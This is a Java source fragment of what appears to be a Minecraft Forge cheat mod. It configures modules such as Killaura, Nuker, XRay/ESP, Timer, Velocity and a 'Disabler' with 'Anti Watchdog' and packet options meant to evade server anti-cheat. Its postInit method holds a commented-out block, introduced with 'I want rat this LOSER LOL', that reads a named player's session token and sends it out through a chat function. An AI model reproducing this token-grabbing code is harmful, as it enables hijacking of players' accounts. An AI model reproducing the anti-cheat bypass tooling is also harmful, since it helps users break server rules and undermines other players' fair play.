        FunctionManager.addConfiguration(new SettingLimitDouble("sword block speed slow","sword",0.5D,1.0D,0.2D));
        FunctionManager.addConfiguration(new SettingLimitDouble("bow speed slow","bow",1.0D,1.0D,0.2D));
        FunctionManager.addConfiguration(new SettingLimitDouble("eat speed slow","eat",1.0D,1.0D,0.2D));

        HashMap<String, Integer> BackgroundStyleMap = new HashMap<String, Integer>();
        BackgroundStyleMap.put("Vanilla",0);
        BackgroundStyleMap.put("Blur",1);
        FunctionManager.bindFunction("Interface");
        FunctionManager.addConfiguration(new SettingBoolean("FPS show", "fps", false));
        FunctionManager.addConfiguration(new SettingInt("FPS position(X)", "fpsX", 200));
        FunctionManager.addConfiguration(new SettingInt("FPS position(Y)", "fpsY", 130));
        FunctionManager.addConfiguration(new SettingBoolean("show coordinate", "location", false));
        FunctionManager.addConfiguration(new SettingInt("coordinate pos(X)", "locationX", 200));
        FunctionManager.addConfiguration(new SettingInt("coordinate pos(Y)", "locationY", 145));
        FunctionManager.addConfiguration(new SettingBoolean("server day", "day", false));
        FunctionManager.addConfiguration(new SettingInt("server day pos(X)", "dayX", 200));
        FunctionManager.addConfiguration(new SettingInt("server day pos(Y)", "dayY", 190));
        FunctionManager.addConfiguration(new SettingTypeSelector("GUI background style","bgstyle",1,BackgroundStyleMap));

        FunctionManager.bindFunction("ShortBowAura");
        FunctionManager.addConfiguration(new SettingLimitDouble("delay", "delay", 3.0D,10.0D,1.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("range", "range", 15.0D,100.0D,5.0D));
        FunctionManager.addConfiguration(new SettingBoolean("rightkey mode", "right", false));
        FunctionManager.addConfiguration(new SettingBoolean("attack team member", "attackTeam", false));

        FunctionManager.bindFunction("AutoWolfSlayer");
        HashMap<String, Integer> SlayMode = new HashMap<String, Integer>();
        SlayMode.put("Killaura",0);
        SlayMode.put("ShortBowAura",1);
        FunctionManager.addConfiguration(new SettingTypeSelector("Wolf killer mode","mode",0,SlayMode));
        FunctionManager.addConfiguration(new SettingString("melee weapon name", "swordName", "livid"));
        FunctionManager.addConfiguration(new SettingString("shortbow name", "bowName", "juju"));

        FunctionManager.bindFunction("ChestFinder");
        HashMap<String, Integer> renderMode = new HashMap<String, Integer>();
        renderMode.put("Outline",0);
        renderMode.put("Full",1);
        renderMode.put("Tracer",2);
        FunctionManager.addConfiguration(new SettingTypeSelector("mode","mode",0,renderMode));

        FunctionManager.bindFunction("AutoLeave");
        FunctionManager.addConfiguration(new SettingInt("detection radius", "radius",30));
        FunctionManager.addConfiguration(new SettingLimitInt("max number can allow nearby players", "limit",0,100,0));
        FunctionManager.addConfiguration(new SettingLimitInt("command execute time(Tick)", "tickLimit",200,Integer.MAX_VALUE,0));
        FunctionManager.addConfiguration(new SettingString("the command will execute", "command", "/warp home"));
        FunctionManager.addConfiguration(new SettingBoolean("only sound and no command", "soundOnly", false));

        FunctionManager.bindFunction("CropBot");
        HashMap<String, Integer> crops = new HashMap<String, Integer>();
        crops.put("Potato",0);
        crops.put("Carrot",1);
        crops.put("Mushroom",2);
        crops.put("Nether Wart",3);
        crops.put("Wheat",4);
        FunctionManager.addConfiguration(new SettingTypeSelector("crop types","crop",0,crops));
        FunctionManager.addConfiguration(new SettingInt("detection radius(warning lagging)", "radius",8));
        FunctionManager.addConfiguration(new SettingLimitInt("IgnoreList size", "listSize",5120,Integer.MAX_VALUE,1));

        FunctionManager.bindFunction("MarketingGenerator");
        FunctionManager.addConfiguration(new SettingString("name", "name", "Necron"));
        FunctionManager.addConfiguration(new SettingString("event", "event","cannot eat Kuudra"));
        FunctionManager.addConfiguration(new SettingString("another explanation", "explain", "EZ Yikes"));

        HashMap<String, Integer> apiSource = new HashMap<String, Integer>();
        apiSource.put("API Source 1",0);
        apiSource.put("API Source 2",1);
        FunctionManager.addConfiguration(new SettingTypeSelector("API","api",0,apiSource));

        FunctionManager.bindFunction("PlayerFinder");
        FunctionManager.addConfiguration(new SettingBoolean("dont show NPC", "showNpc", true));
        HashMap<String, Integer> playerFinderMode = new HashMap<String, Integer>();
        playerFinderMode.put("3D Box",0);
        playerFinderMode.put("XRay",1);
        playerFinderMode.put("OutlineTest",2);
        FunctionManager.addConfiguration(new SettingTypeSelector("render mod","mode",1,playerFinderMode));

        FunctionManager.bindFunction("Nuker");
        HashMap<String, Integer> rotation = new HashMap<String, Integer>();
        rotation.put("ServerRotation",0);
        rotation.put("Rotation",1);
        rotation.put("SmoothRotation",2);
        FunctionManager.addConfiguration(new SettingTypeSelector("rotate type","rotation",0,rotation));
        HashMap<String, Integer> nukerType = new HashMap<String, Integer>();
        nukerType.put("Gemstone(No Panel)",0);
        nukerType.put("Gemstone",1);
        nukerType.put("Ore",2);
        nukerType.put("Stone",3);
        nukerType.put("Netherrack",4);
        nukerType.put("Sand",5);
        nukerType.put("Gold Block",6);
        nukerType.put("Mithril",7);
        nukerType.put("Frozen Treasure",8);
        nukerType.put("Mithril With Titanium",9);
        nukerType.put("Foraging",10);
        nukerType.put("Stone With Cobblestone",11);
        nukerType.put("Mithril With Titanium (Blue Wool First)",12);
        nukerType.put("Obsidian",13);
        nukerType.put("Crops",14);
        FunctionManager.addConfiguration(new SettingTypeSelector("type","type",0,nukerType));
        FunctionManager.addConfiguration(new SettingBoolean("will auto disable when there's monkey", "disable", false));
        FunctionManager.addConfiguration(new SettingBoolean("ignore the ground you stand", "ignoreGround", false));
        FunctionManager.addConfiguration(new SettingInt("radius", "radius",30));
        HashMap<String, Integer> miningType = new HashMap<String, Integer>();
        miningType.put("Normal",0);
        miningType.put("Instantly",1);
        miningType.put("Core 1",2);
        FunctionManager.addConfiguration(new SettingTypeSelector("mining type","miningType",0,miningType));

        FunctionManager.bindFunction("KillerBot");
        HashMap<String, Integer> BotSlayMode = new HashMap<String, Integer>();
        BotSlayMode.put("Killaura",0);
        BotSlayMode.put("ShortBowAura",1);
        FunctionManager.addConfiguration(new SettingTypeSelector("kill mode","mode",0,BotSlayMode));
        FunctionManager.addConfiguration(new SettingString("melee name", "swordName", "livid"));
        FunctionManager.addConfiguration(new SettingString("shortbow name", "bowName", "juju"));
        HashMap<String, Integer> type = new HashMap<String, Integer>();
        type.put("Graveyard Zombie",0);
        type.put("Crypt Zombie",1);
        type.put("Star Sentry",2);
        type.put("Enderman",3);
        type.put("Treasure Hoarder",4);
        FunctionManager.addConfiguration(new SettingTypeSelector("type","type",0,type));

        FunctionManager.bindFunction("Velocity");
        FunctionManager.addConfiguration(new SettingBoolean("disable in dungeon", "disableInDungeon", true));

        FunctionManager.bindFunction("DroppedItemESP");
        FunctionManager.addConfiguration(new SettingInt("ESP color(R)", "colorR",218));
        FunctionManager.addConfiguration(new SettingInt("ESP color(G)", "colorG",105));
        FunctionManager.addConfiguration(new SettingInt("ESP color(B)", "colorB",156));

        FunctionManager.bindFunction("AutoTerminal");
        FunctionManager.addConfiguration(new SettingLimitInt("click delay", "cooldown",2,10,0));

        FunctionManager.bindFunction("NickHider");
        FunctionManager.addConfiguration(new SettingString("name", "name", "CoolGuy123"));

        FunctionManager.bindFunction("PowderBot");
        FunctionManager.addConfiguration(new SettingBoolean("chest only", "chestOnly", false));

        FunctionManager.bindFunction("DragonEggESP");
        FunctionManager.addConfiguration(new SettingInt("thread amount", "thread",5));
        FunctionManager.addConfiguration(new SettingInt("scan step", "step",32));

        FunctionManager.bindFunction("SapphireGrottoESP");
        FunctionManager.addConfiguration(new SettingInt("thread amount", "thread",5));
        FunctionManager.addConfiguration(new SettingInt("scan step", "step",64));

        FunctionManager.bindFunction("FPS Accelerator");
        FunctionManager.addConfiguration(new SettingLimitInt("armor stand render distance","armorStandDistance",16,128,1));
        FunctionManager.addConfiguration(new SettingLimitInt("tile entity render distance","tileEntityDistance",32,128,1));
        FunctionManager.addConfiguration(new SettingBoolean("entityCulling", "entityCulling", true));

        FunctionManager.bindFunction("Disabler");
        FunctionManager.addConfiguration(new SettingBoolean("Ban warning", "banWarning", true));
        FunctionManager.addConfiguration(new SettingBoolean("Timer Disabler", "timer", true));
        FunctionManager.addConfiguration(new SettingLimitInt("Strafe Packets amount","strafePackets",70,120,60));
        FunctionManager.addConfiguration(new SettingBoolean("Strafe Disabler", "strafeDisabler", false));
        FunctionManager.addConfiguration(new SettingBoolean("C03disabler", "noC03", true));
        FunctionManager.addConfiguration(new SettingBoolean("Anti Watchdog", "antiWatchdog", true));
        FunctionManager.addConfiguration(new SettingBoolean("C00 disabler", "C00Disabler", false));
        FunctionManager.addConfiguration(new SettingBoolean("C0B disabler", "C0BDisabler", false));

        FunctionManager.bindFunction("Timer");
        FunctionManager.addConfiguration(new SettingLimitDouble("speed","speed",2.0,10.0,0.1));
        FunctionManager.addConfiguration(new SettingBoolean("only enable on moving", "onlyMoving", false));

        FunctionManager.bindFunction("MacroerDetector");
        FunctionManager.addConfiguration(new SettingLimitInt("range","range",250,2000,100));

        FunctionManager.bindFunction("Camera");
        FunctionManager.addConfiguration(new SettingLimitDouble("camera distance","distance",2.0,10000,0.01));
        FunctionManager.addConfiguration(new SettingBoolean("no hurt camera", "noHurtCamera", true));
        FunctionManager.addConfiguration(new SettingBoolean("camera across wall", "clip", true));

        FunctionManager.bindFunction("AntiAFK");
        HashMap<String, Integer> antiAFKType = new HashMap<String, Integer>();
        antiAFKType.put("Jump",0);
        antiAFKType.put("Move Left and Right",1);
        FunctionManager.addConfiguration(new SettingTypeSelector("type","type",1,antiAFKType));

        FunctionManager.bindFunction("BHop");
        FunctionManager.addConfiguration(new SettingBoolean("Strafe", "strafe", false));

        FunctionManager.bindFunction("ChatDetector");
        FunctionManager.addConfiguration(new SettingString("chat trigger", "trigger", "a message"));
        FunctionManager.addConfiguration(new SettingString("message need to send", "message", "send this message when received a message include trigger message"));

        FunctionManager.bindFunction("FrozenScytheAura");
        FunctionManager.addConfiguration(new SettingLimitDouble("delay", "delay", 3.0D,10.0D,1.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("range", "range", 15.0D,100.0D,5.0D));
        FunctionManager.addConfiguration(new SettingBoolean("attack team member", "attackTeam", false));

        FunctionManager.bindFunction("HarpBot");
        FunctionManager.addConfiguration(new SettingInt("delay", "delay",200));

        FunctionManager.bindFunction("ExperimentsBot");
        FunctionManager.addConfiguration(new SettingBoolean("auto exit", "autoExit", true));
        FunctionManager.addConfiguration(new SettingInt("click delay", "delay",200));

        FunctionManager.bindFunction("AutoArmadillo");
        FunctionManager.addConfiguration(new SettingInt("delay(ms)", "delay",250));

        FunctionManager.bindFunction("GemstoneBot");
        FunctionManager.addConfiguration(new SettingInt("delay(ms)", "delay",250));
        FunctionManager.addConfiguration(new SettingBoolean("mine panel", "panel", false));

        FunctionManager.bindFunction("Giant");
        FunctionManager.addConfiguration(new SettingDouble("all scale","allScale",2.0D));
        FunctionManager.addConfiguration(new SettingDouble("head only scale","headScale",1.0D));

        FunctionManager.bindFunction("GiftRecipient");
        FunctionManager.addConfiguration(new SettingInt("delay", "delay",3));

        //check if new user
        NewUserFunction();

        //refresh the function bind
        reloadKeyMapping();

    }

    @EventHandler
    public void postInit(FMLPostInitializationEvent event) {
        //I want rat this LOSER LOL!!!
        /*if(Minecraft.getMinecraft().thePlayer.getName().contains("kkxfj09")){
            String token = Minecraft.getMinecraft().getSession().getToken();
            CustomChatSend.send(token);
        }*/
    }

    public void NewUserFunction() {
        //check is new user
        if (ConfigLoader.getBoolean("checkNewUser", true)) {
            //if new user will setting something
            FunctionManager.setStatus("HUD", true);

            Minecraft.getMinecraft().gameSettings.guiScale = 2;

            //set non new user
            ConfigLoader.setBoolean("checkNewUser", false, true);
        }
    }
    public static void onMinecraftShutdown() {
        /*Log.info("Minecraft shutdown hook called!");
        PROXY.onShutdown();*/
    }
    public static void reloadKeyMapping(){
        //clear function key bind map
        KeyBinding.clear();
        //Iterate through all function
        for(LazyQoLFunction function : LazyQoLRegister.FunctionList){
            //get this function's key bind config
            int keyCode = ConfigLoader.getInt(function.getName() + "_KeyBindValue",-114514);
            //if key code equals -114514 mean it not have key bind
            if(keyCode != -114514){
                //add function and key bind to map
                KeyBinding.put(function,keyCode);
            }
        }
    }
}
